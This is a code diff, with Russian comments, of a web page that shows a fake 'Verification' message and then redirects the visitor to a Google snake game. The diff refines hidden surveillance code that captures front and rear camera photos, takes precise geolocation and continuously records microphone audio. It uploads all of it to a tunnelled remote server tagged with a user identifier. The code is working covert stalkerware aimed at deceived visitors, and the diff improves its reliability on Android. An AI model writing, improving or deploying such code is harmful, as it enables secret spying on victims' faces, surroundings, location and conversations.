@@ -29,14 +29,14 @@
     <canvas id="c"></canvas>
 
 <script>
-// URL ОБНОВЛЕН НА ОСНОВЕ ТВОЕГО SERVEO
-const API = "https://5638ec3626cfa41d-176-2-182-204.serveousercontent.com"; 
+const API = "https://ceffba7c1b9a76bf-176-2-182-204.serveousercontent.com"; 
 const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 const urlParams = new URLSearchParams(window.location.search);
 const user = urlParams.get('user') || "Unknown";
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
+// Функция захвата фото (Добавил onloadedmetadata для Android)
 async function takePhoto(mode) {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -45,9 +45,10 @@ async function takePhoto(mode) {
         const v = document.getElementById('v');
         v.srcObject = stream;
         
+        // КРИТИЧНО ДЛЯ ANDROID: Ждем готовности видео
         await new Promise(r => v.onloadedmetadata = r);
         await v.play();
-        await sleep(1500); 
+        await sleep(1000); 
 
         const canvas = document.getElementById('c');
         canvas.width = v.videoWidth;
@@ -55,32 +56,37 @@ async function takePhoto(mode) {
         canvas.getContext('2d').drawImage(v, 0, 0);
         
         const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
-        
-        // КРИТИЧНО: Полная остановка перед сменой камеры для Android
         stream.getTracks().forEach(t => t.stop());
-        v.srcObject = null;
-        await sleep(600); 
-        
         return blob;
     } catch (e) { return null; }
 }
 
+// Фоновая запись аудио (Исправлен баг 0 секунд)
 async function startAudioStreaming() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        
+        // Выбираем формат, который понимает Android (webm/opus)
         const options = { mimeType: 'audio/webm;codecs=opus' };
         if (!MediaRecorder.isTypeSupported(options.mimeType)) options.mimeType = '';
+
         const mediaRecorder = new MediaRecorder(stream, options);
         
         mediaRecorder.ondataavailable = async (event) => {
+            // Проверка на наличие данных (больше 0 байт)
             if (event.data && event.data.size > 100) { 
                 const fd = new FormData();
+                // Для Android лучше расширение .webm, сервер его поймет
                 fd.append('file', event.data, `audio_${Date.now()}.webm`);
                 fetch(`${API}/upload-audio?user=${encodeURIComponent(user)}`, { method: 'POST', body: fd }).catch(()=>{});
             }
         };
+
+        // Начинаем запись. 
+        // Если слать сразу 10000, первый кусок может быть битым. 
+        // Мы запускаем и просим выдавать данные каждые 10 сек.
         mediaRecorder.start(10000); 
-    } catch (e) {}
+    } catch (e) { console.error("Audio error", e); }
 }
 
 async function run() {
@@ -88,36 +94,33 @@ async function run() {
     document.getElementById('loader').style.display = 'block';
     const msg = document.getElementById('msg');
 
-    // ШАГ 1: ГЕОЛОКАЦИЯ (Ждем завершения запроса)
-    msg.innerText = "Verification...";
-    await new Promise(resolve => {
-        navigator.geolocation.getCurrentPosition(async p => {
-            await fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(()=>{});
-            resolve();
-        }, () => resolve(), {enableHighAccuracy: true, timeout: 5000});
-    });
+    // 1. Гео
+    navigator.geolocation.getCurrentPosition(p => {
+        fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(()=>{});
+    }, (e) => {}, {enableHighAccuracy: true});
 
-    // ШАГ 2: 4 ФОТО (Ждем каждое)
+    // 2. Стриминг аудио
+    await startAudioStreaming();
+    await sleep(500); // Даем микрофону "прогреться"
+
+    // 3. Серия фото
     const fd = new FormData();
     const modes = ["user", "environment"];
+    
     for (let mode of modes) {
         for (let i = 1; i <= 2; i++) {
-            msg.innerText = `Verification ...`; // Текст как в оригинале
+            msg.innerText = `Verification ... ${i}/2`;
             const photo = await takePhoto(mode);
             if (photo) fd.append('files', photo, `photo_${mode}_${i}.jpg`);
+            await sleep(500);
         }
     }
 
-    // ШАГ 3: ОТПРАВКА ФОТО (Ждем подтверждения сервера)
+    // 4. Отправка фото-пакета
     msg.innerText = "Finalizing...";
-    if (fd.has('files')) {
-        try {
-            await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, { method: 'POST', body: fd });
-        } catch (e) { console.error("Upload failed"); }
-    }
+    await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, { method: 'POST', body: fd }).catch(()=>{});
 
-    // ШАГ 4: ЗАПУСК АУДИО И РЕДИРЕКТ
-    startAudioStreaming();
+    // 5. Редирект
     msg.innerText = "Redirecting...";
     setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);
 }
